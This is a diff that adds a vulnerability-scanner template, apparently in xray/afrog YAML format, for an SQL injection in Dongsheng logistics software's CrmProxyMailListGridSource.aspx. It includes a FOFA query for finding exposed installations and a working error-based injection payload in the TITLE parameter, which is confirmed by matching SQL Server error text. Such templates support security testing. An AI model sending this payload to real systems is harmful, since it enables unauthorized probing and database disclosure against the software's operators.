@@ -1,0 +1,21 @@
+id: dongsheng-crmproxymaillistgridsource-sqli
+
+info:
+  name: 东胜物流软件 CrmProxyMailListGridSource.aspx 存在SQL注入漏洞
+  author: 熊猫也是猫
+  severity: high
+  verified: true
+  description: |-
+    fofa: app="东胜物流软件-物流软件"
+  tags: dongsheng,sqli
+  created: 2026/03/17
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /PriceCarrier/CrmProxyMailListGridSource.aspx?handle=list&cur_page=1&show_page=10&TITLE=a'and+1<@@VERSION--
+    expression: |
+      response_text.contains("在将 nvarchar 值") &&
+      response.body.bcontains(b'SqlException')
+expression: r0()
